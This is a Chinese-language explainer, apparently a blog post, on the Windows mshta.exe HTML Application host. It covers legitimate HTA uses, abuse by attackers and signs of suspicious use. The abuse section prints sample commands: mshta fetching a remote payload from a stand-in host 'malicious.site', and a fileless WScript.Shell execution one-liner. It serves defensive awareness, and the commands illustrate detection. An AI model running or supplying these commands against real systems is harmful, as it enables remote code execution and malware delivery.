   <div class="htmledit_views" id="content_views">
    <p>
     <code>
      mshta.exe
     </code>
     是微软的
     <strong>
      HTML 应用程序宿主程序
     </strong>
     （Microsoft HTML Application Host），属于 Windows 系统组件。它的核心功能是运行
     <code>
      .hta
     </code>
     （HTML Application）文件，允许通过 HTML、JavaScript、VBScript 等技术创建交互式图形界面应用。
    </p>
    <hr/>
    <h4>
     何时会调用
     <code>
      mshta.exe
     </code>
     ？
    </h4>
    <h5>
     1.
     <strong>
      合法用途
     </strong>
    </h5>
    <ul>
     <li>
      <strong>
       运行本地/企业级 HTA 应用
      </strong>
      ：
      <ul>
       <li>
        企业可能用
        <code>
         .hta
        </code>
        开发内部工具（如配置向导、管理界面）。
       </li>
       <li>
        示例命令：
        <code>
         mshta.exe C:\tools\config.hta
        </code>
       </li>
      </ul>
     </li>
     <li>
      <strong>
       执行系统脚本
      </strong>
      ：
      <ul>
       <li>
        通过命令行调用 JavaScript/VBScript（无需保存为文件）。
       </li>
       <li>
        示例：
        <pre><code>mshta.exe "javascript:alert('Hello World');close()"
</code></pre>
       </li>
      </ul>
     </li>
    </ul>
    <h5>
     2.
     <strong>
      潜在恶意用途
     </strong>
     （需警惕）
    </h5>
    <ul>
     <li>
      <strong>
       绕过安全防护
      </strong>
      ：
      <ul>
       <li>
        攻击者可能通过
        <code>
         mshta.exe
        </code>
        执行远程恶意脚本（如下载木马、提权）。
       </li>
       <li>
        示例：
        <pre><code>mshta.exe "http://malicious.site/payload.hta"
</code></pre>
       </li>
      </ul>
     </li>
     <li>
      <strong>
       无文件攻击
      </strong>
      ：
      <ul>
       <li>
        直接在内存中执行代码，不写入磁盘。
       </li>
       <li>
        示例：
        <pre><code>mshta.exe "javascript:new ActiveXObject('WScript.Shell').Run('calc.exe')"
</code></pre>
       </li>
      </ul>
     </li>
     <li>
      <strong>
       伪装进程
      </strong>
      ：
      <ul>
       <li>
        恶意进程可能命名为
        <code>
         mshta.exe
        </code>
        以混淆检测（需检查文件路径是否合法）。
       </li>
      </ul>
     </li>
    </ul>
    <hr/>
    <h4>
     如何识别可疑行为？
    </h4>
    <ol>
     <li>
      <p>
       <strong>
        检查命令行参数
       </strong>
       ：
      </p>
      <ul>
       <li>
        合法场景通常指向本地
        <code>
         .hta
        </code>
        文件或简单脚本。
       </li>
       <li>
        可疑场景可能包含：
        <ul>
         <li>
          远程 URL（如
          <code>
           http://
          </code>
          、
          <code>
           \\192.168.x.x
          </code>
          ）。
         </li>
         <li>
          长串混淆的 JavaScript/VBScript 代码。
         </li>
         <li>
          敏感命令（如下载文件、启动 PowerShell 等）。
         </li>
        </ul>
       </li>
      </ul>
     </li>
     <li>
      <p>
       <strong>
        验证文件路径
       </strong>
       ：
      </p>
      <ul>
       <li>
        合法
        <code>
         mshta.exe
        </code>
        路径为
        <code>
         C:\Windows\System32\mshta.exe
        </code>
        。
       </li>
       <li>
        其他路径（如临时目录）可能是恶意文件。
       </li>
      </ul>
     </li>
     <li>
      <p>
       <strong>
        监控进程上下文
       </strong>
       ：
      </p>
      <ul>
       <li>
        若
        <code>
         mshta.exe
        </code>
        在非交互式场景（如计划任务、启动项）运行，需警惕。
       </li>
      </ul>
     </li>
    </ol>
